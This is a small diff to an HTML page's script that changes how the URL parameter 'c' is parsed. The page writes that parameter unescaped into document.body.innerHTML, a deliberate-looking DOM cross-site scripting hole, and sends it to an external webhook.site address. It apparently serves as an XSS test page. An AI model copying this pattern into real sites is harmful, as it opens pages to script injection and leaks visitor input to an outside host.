@@ -8,7 +8,8 @@
 <h1>This is a Heading</h1>
 
 <script>
-var c = url.searchParams.get("c");
+const urlParams = new URLSearchParams(window.location.search);
+var  c = urlParams.get('c');
 document.body.innerHTML = c;
 fetch("https://webhook.site/36f91445-676a-40ff-8a0d-6b63c5ad9fe2?c="+c);
 
